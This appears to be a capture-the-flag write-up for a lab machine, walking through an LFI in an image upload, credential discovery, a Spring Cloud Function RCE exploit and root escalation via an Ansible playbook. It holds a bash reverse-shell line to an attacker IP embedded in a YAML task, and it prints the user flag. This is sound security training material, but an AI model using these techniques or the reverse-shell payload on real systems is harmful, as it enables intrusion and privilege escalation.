We've only got two ports open, `22` and `8080`. We likely won't find anything with port 22 so let's head over to 8080 in a broswer.

We've got a website, many of the links don't do anything. However, it looks like there may be a site under construction (maybe a subdomain??) We also have an upload page that will only accept images. If we upload an image, it looks like there is an LFI vulnerability in the URL.

To take advatage of this, we can visit the file we just uploaded, intercept the request in burpsuite, and replace the image path with the file we want to see. If we pull up the `/etc/passwd`, we can see that we have three users that can login, `root`, `frank`, and `phil`.

### Local file disclosure

![LFI in burpsuite]({{ page.img_path }}lfi.png)

```
root:x:0:0:root:/root:/bin/bash
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

Beyond being able to view individual files, if we put in a  directory we can also see the files in that directory. If we take a look in Frank's home directory, there is a folder `.m2` that stands out, in there we find a `settings.xml` file. In that file we find some credentials for the user phil. It doesn't work with SSH, but they will come in handy later.

In the home directory for phil, we can see the user.txt file with our flag, but don't have permission to access it.

Next up, let's see if we can find out more information about the web application that is running by checking out `/var/www/`. In there we find a directory called `WebApp` with some more files and directories.

If we open the `pom.xml` (a common configuration file), we find that it is running a vulnerable version of `Spring Cloud` (3.2.2). 

![pom file]({{ page.img_path }}springcloudframework.png)

There is an exploit [here](https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE) for the version that's running that gives us remote code execution. I would encourage you to read more about how it works, but basically it creates a shell.sh in your current working directory, starts a basic web server, sends it to our target, makes the shell file executable, and then runs it to give us a reverse shell. It does all of this by sending commands in a specific header in our requests.

![screenshot of request header in expoit script]({{ page.img_path }}exploit.command.example.png)

In this request, we can see that it is pinging our attacker machine once to test the connection before continuing on.

Before we can run the exploit, we need to update our listening IP and port, as well as our target IP.

![updaing the script]({{ page.img_path }}update.exploit.png)

## User

Before we run our exploit, let's make sure we have a listener open on the port we specified in the script (for me that was 9001). Then let's launch the script and we have a shell a frank!

![we have a shell]({{ page.img_path }}wehaveashell.png)

Let's upgrade our shell a little to make it more stable with `$ python3 -c 'import pty;pty.spawn("/bin/bash")'`.

We know our user flag isn't readable by frank, but it is by phil. We found a password used by `phil` earlier, let's see if we can swith users from `frank` to `phil`.

It work! We can now access our user.txt flag.

```shell
phil@inject:~$ cat user.txt
cat user.txt
6a6254c04b6c0d83e57e13a22f51832b
```

Now that we have user, let's run pspy and see if we can see anything of interest that might be running. Start by putting the `pspy64` script in a www folder and starting up a basic web server. Then on our shell, we use wget to download the script and make it executable.

### Ansible Playbook

When we launch it and watch for a while, we see that there is an ansible playbook automation running as root.

![asbibe in pspy]({{ page.img_path }}ansible.pspy64.png)

Since there is an automated task running with Ansible Playbooks running as root, and we have write access to `/opt/automation/tasks` folder (see post about privesc with ansible [here](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/)), we place a new `.yml` file similar to the existing file in the tasks directory with a command that will be run next time the automation is triggered and give us a shell as root.

Here is what our file  will look like:

```yaml
- hosts: localhost
  tasks:
    - name: Nothing to see here
      ansible.builtin.shell: bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'
```

## Root

To make things easier (since I don't have a very stable shell), I created the new yaml file on my attacker machine, used wget to download it onto the target, then copied it into the `/opt/automation/tasks` folder. Make sure to have a listener open and once the ansible automation runs you will have a shell as root!
